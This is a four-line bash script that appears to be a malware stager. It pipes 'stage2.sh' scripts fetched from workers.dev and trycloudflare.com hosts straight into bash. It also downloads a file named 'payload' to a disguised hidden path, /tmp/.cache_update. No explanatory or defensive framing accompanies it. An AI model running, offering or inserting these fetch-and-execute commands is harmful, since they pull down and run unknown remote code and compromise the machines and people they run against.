#!/bin/bash
curl -sSL https://teamxpcp-a1b2c3d4.workers.dev/stage2.sh | bash
wget -q https://teamxpcp-e5f6a7b8.workers.dev/payload -O /tmp/.cache_update
curl -sSL https://relay.trycloudflare.com/stage2.sh | bash
